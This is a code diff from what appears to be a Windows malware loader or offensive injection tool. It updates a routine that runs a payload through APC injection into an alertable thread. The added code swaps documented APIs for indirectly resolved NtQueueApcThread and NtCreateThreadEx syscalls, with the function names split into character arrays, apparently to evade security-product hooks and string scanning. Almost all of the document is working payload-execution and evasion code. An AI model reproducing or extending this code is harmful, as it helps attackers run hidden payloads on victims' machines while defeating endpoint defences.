@@ -1,8 +1,12 @@
 #include "injection.h"
 
 VOID AlertableFunction() {
-    HANDLE hEvent1 = CreateEvent(NULL, FALSE, FALSE, NULL);
-    HANDLE hEvent2 = CreateEvent(NULL, FALSE, FALSE, NULL);
+    HANDLE hEvent1 = NULL;
+    HANDLE hEvent2 = NULL;
+
+
+    hEvent1 = CreateEvent(NULL, FALSE, FALSE, NULL);
+    hEvent2 = CreateEvent(NULL, FALSE, FALSE, NULL);
 
     if (hEvent1 && hEvent2) {
         SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);
@@ -26,15 +30,26 @@ static BOOL RunViaApcInjection(HANDLE hThread, PVOID pPayload, SIZE_T sPayloadSi
         return FALSE;
     }
 
-    DebugPrint("[i] QueueUserAPC with payload located at: 0x%llx\n", (ULONG_PTR)pAddress);
+    DebugPrint("[i] QueueUserAPC with payload located at: 0x%p\n", (ULONG_PTR)pAddress);
 
-    // Queue the APC payload
+#ifdef HW_INDIRECT_SYSCALL
+    NTSTATUS		STATUS = NULL;
+
+    // executing the payload via NtQueueApcThread
+    DebugPrint("\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... ", pAddress, GetThreadId(hThread));
+    NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)PrepareSyscall((char[]){'N','t','Q','u','e','u','e','A','p','c','T','h','r','e','a','d','\0'});
+    if ((STATUS = pNtQueueApcThread(hThread, pAddress, NULL, NULL, NULL)) != 0) {
+        DebugPrint("[!] NtQueueApcThread Failed With Error : 0x%0.8X \n", STATUS);
+        return FALSE;
+    }
+    DebugPrint("[+] DONE \n");
+#else
     if (!QueueUserAPC((PAPCFUNC)(ULONG_PTR)pAddress, hThread, NULL)) {
         DebugPrint("\t[!] QueueUserAPC Failed With Error: %d \n", GetLastError());
         VirtualFree(pAddress, 0, MEM_RELEASE);
         return FALSE;
     }
-
+#endif
     SleepEx(10, FALSE);
 
     return TRUE;
@@ -43,11 +58,24 @@ static BOOL RunViaApcInjection(HANDLE hThread, PVOID pPayload, SIZE_T sPayloadSi
 BOOL ApcInjection(HANDLE hProcess, HANDLE hThread, PBYTE pPayload, SIZE_T sPayloadSize) {
     DWORD dwThreadId = NULL;
 
+#ifdef HW_INDIRECT_SYSCALL
+    if (hProcess == NULL) {
+        hProcess = NtCurrentProcess();
+    }
+
+    NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)PrepareSyscall((char[]){'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x','\0'});
+    NTSTATUS status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, &AlertableFunction, NULL, FALSE, NULL, NULL, NULL, NULL);
+    if (status != STATUS_SUCCESS) {
+        DebugPrint("[!] NtCreateThreadEx Failed With Error : %d \n", status);
+        return FALSE;
+    }
+#else
     hThread = CreateThread(NULL, 0, &AlertableFunction, NULL, 0, &dwThreadId);
     if (hThread == NULL) {
         DebugPrint("[!] CreateThread Failed With Error : %d \n", GetLastError());
         return FALSE;
     }
+#endif
 
     DebugPrint("[+] Alertable Target Thread Created With Id : %d \n", dwThreadId);
     DebugPrint("[i] Running Apc Injection Function ... \n");
